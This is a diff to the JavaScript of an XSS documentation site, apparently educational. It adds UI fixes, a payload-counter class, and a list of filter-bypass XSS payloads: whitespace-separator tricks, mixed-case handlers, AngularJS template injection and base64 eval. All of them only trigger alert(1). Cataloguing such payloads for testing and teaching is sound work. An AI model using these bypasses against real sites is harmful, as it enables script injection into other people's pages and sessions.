@@ -1,5 +1,16 @@
 /* XSS Documentation Interactive Features */
 
+// Type declarations for window properties
+/**
+ * @typedef {Object} DocsManager
+ * @property {function} previousSection
+ * @property {function} nextSection
+ * @property {function} setupIntersectionObserver
+ */
+
+// Extend window object
+window.docsManager = window.docsManager || null;
+
 class DocsManager {
   constructor() {
     this.currentSection = 0;
@@ -240,7 +251,9 @@ class DocsManager {
       }
 
       // Add active class to selected button
-      event.target.classList.add('active');
+      if (event && event.target) {
+        event.target.classList.add('active');
+      }
     };
   }
 
@@ -389,6 +402,20 @@ const XSSExamples = {
     '<svg><animate onbegin=alert(1) attributeName=x></svg>',
     '<script>Function("ale"+"rt(1)")()</script>',
     '<iframe srcdoc="<script>parent.alert(1)</script>">'
+  ],
+
+  // Advanced research techniques from Sam Anttila
+  advancedResearch: [
+    '<img\\fsrc=x\\fonerror=alert(1)>', // Form feed separator
+    '<img\\rsrc=x\\ronerror=alert(1)>', // Carriage return separator
+    '<img src=x OnErRoR=alert(1)>', // Case sensitivity bypass
+    '<svg ONlOaD=alert(1)>', // Mixed case event handler
+    '<video onloadstart=alert(1)>', // HTML5 event handler
+    '<audio oncanplay=alert(1)>', // Modern media event
+    '<details onbeforetoggle=alert(1) open>', // Experimental event
+    '{{constructor.constructor(\'alert(1)\')()}}', // AngularJS template injection
+    '<img src=x onerror=eval(atob(\'YWxlcnQoMSk=\'))>', // Double-encoding bypass
+    '<iframe srcdoc="&lt;script&gt;parent.alert(1)&lt;/script&gt;">' // HTML entity srcdoc
   ]
 };
 
@@ -405,9 +432,74 @@ window.nextSection = () => {
   }
 };
 
+// Dynamic Payload Counter
+class PayloadCounter {
+  constructor() {
+    this.loadPayloadCount();
+  }
+
+  async loadPayloadCount() {
+    try {
+      const response = await fetch('data/payloads.yaml?v=' + Date.now(), {
+        cache: 'no-cache'
+      });
+      const yamlText = await response.text();
+
+      // Count payload entries dynamically
+      const payloadMatches = yamlText.match(/^\s*- code: \|/gm);
+      const payloadCount = payloadMatches ? payloadMatches.length : 0;
+
+      this.updatePayloadCount(payloadCount);
+    } catch (error) {
+      console.warn('Failed to load payload count:', error);
+      // Show error state if loading fails
+      this.updatePayloadCountError();
+    }
+  }
+
+  updatePayloadCount(count) {
+    // Update main description count
+    const countElement = document.getElementById('dynamicPayloadCount');
+    if (countElement) {
+      countElement.textContent = count > 0 ? `${count}` : 'many';
+      countElement.style.color = 'var(--neon-green)';
+      countElement.style.fontWeight = '600';
+    }
+
+    // Update payload link count
+    const linkCountElement = document.getElementById('payloadLinkCount');
+    if (linkCountElement) {
+      linkCountElement.textContent = count > 0 ? `${count}` : 'many';
+      linkCountElement.style.color = 'var(--neon-cyan)';
+      linkCountElement.style.fontWeight = '600';
+    }
+  }
+
+  updatePayloadCountError() {
+    // Update main description count
+    const countElement = document.getElementById('dynamicPayloadCount');
+    if (countElement) {
+      countElement.textContent = 'many';
+      countElement.style.color = 'var(--neon-green)';
+      countElement.style.fontWeight = '600';
+    }
+
+    // Update payload link count
+    const linkCountElement = document.getElementById('payloadLinkCount');
+    if (linkCountElement) {
+      linkCountElement.textContent = 'many';
+      linkCountElement.style.color = 'var(--neon-cyan)';
+      linkCountElement.style.fontWeight = '600';
+    }
+  }
+}
+
 // Initialize Documentation Manager
 document.addEventListener('DOMContentLoaded', () => {
   window.docsManager = new DocsManager();
+
+  // Initialize payload counter
+  new PayloadCounter();
 
   // Setup intersection observer after a short delay
   setTimeout(() => {
